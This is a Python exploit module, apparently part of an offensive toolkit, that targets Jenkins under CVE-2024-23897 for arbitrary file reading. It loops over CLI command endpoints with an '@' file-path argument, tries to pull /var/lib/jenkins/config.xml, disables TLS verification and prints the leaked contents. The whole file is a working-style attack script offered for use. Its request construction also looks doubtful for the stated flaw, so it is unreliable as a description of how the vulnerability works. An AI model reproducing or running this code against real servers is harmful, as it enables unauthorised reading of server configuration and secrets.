# exploits_sample/cve_2024_23897.py
import requests
from rich.console import Console

console = Console()
cve = "CVE-2024-23897"

def run(tool, lhost=None, lport=None):
    """Exploit CVE-2024-23897 for arbitrary file reading."""
    console.print(f"[yellow][*] Running {cve} exploit...[/yellow]")
    file_path = "/var/lib/jenkins/config.xml"
    cli_endpoints = ["who-am-i", "connect-node", "enable-job", "keep-build"]
    for cli in cli_endpoints:
        url = f"{tool.jenkins_url}/{cli}/@\"{file_path}\""
        try:
            r = requests.get(url, auth=tool.auth, headers=tool.custom_headers, proxies=tool.proxies, verify=False)
            if r.status_code == 200:
                console.print(f"[green][+] File content:\n{r.content.decode('utf-8')[:300]}...[/green]")
                return {"exploit": cve, "status": "success", "details": "File read successfully"}
            elif r.status_code == 403:
                console.print(f"[red][-] {cli} blocked by perms or CSRF.[/red]")
            else:
                console.print(f"[red][-] {cli} failed ({r.status_code})[/red]")
        except Exception as e:
            console.print(f"[red][!] {cli} error: {e}[/red]")
    return {"exploit": cve, "status": "failed", "details": "File read failed"}
